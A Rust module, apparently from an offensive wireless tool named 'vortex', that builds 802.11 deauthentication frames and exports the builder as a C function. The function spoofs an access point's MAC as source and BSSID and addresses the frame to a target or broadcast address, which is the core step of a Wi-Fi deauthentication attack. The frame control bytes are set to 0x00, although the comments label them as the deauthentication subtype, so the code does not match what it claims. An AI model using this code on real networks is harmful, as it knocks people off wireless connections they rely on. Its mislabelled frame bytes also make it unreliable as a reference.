// modules/wifi/deauth.rs - High performance deauth packet generation
use std::os::raw::{c_uchar, c_int};

pub const DEAUTH_FRAME: [u8; 26] = [
    0x00, 0x00, // Frame Control: Type=Management, Subtype=Deauthentication
    0x00, 0x00, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast/Target
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP MAC
    0x00, 0x00, // Sequence Number
    0x07, 0x00, // Reason Code: 7 (Class 3 frame received from nonassociated STA)
];

#[no_mangle]
pub extern "C" fn vortex_gen_deauth_packet(target_mac: *const c_uchar, ap_mac: *const c_uchar, packet_out: *mut c_uchar) -> c_int {
    if target_mac.is_null() || ap_mac.is_null() || packet_out.is_null() {
        return -1;
    }

    let target = unsafe { std::slice::from_raw_parts(target_mac, 6) };
    let ap = unsafe { std::slice::from_raw_parts(ap_mac, 6) };
    let out = unsafe { std::slice::from_raw_parts_mut(packet_out, 26) };

    // Construct the frame
    out[0] = 0x00;
    out[1] = 0x00; // Deauth subtype

    // Target MAC
    out[4..10].copy_from_slice(target);
    // Source MAC (AP)
    out[10..16].copy_from_slice(ap);
    // BSSID (AP)
    out[16..22].copy_from_slice(ap);

    // Reason code (7)
    out[24] = 0x07;
    out[25] = 0x00;

    0 // Success
}
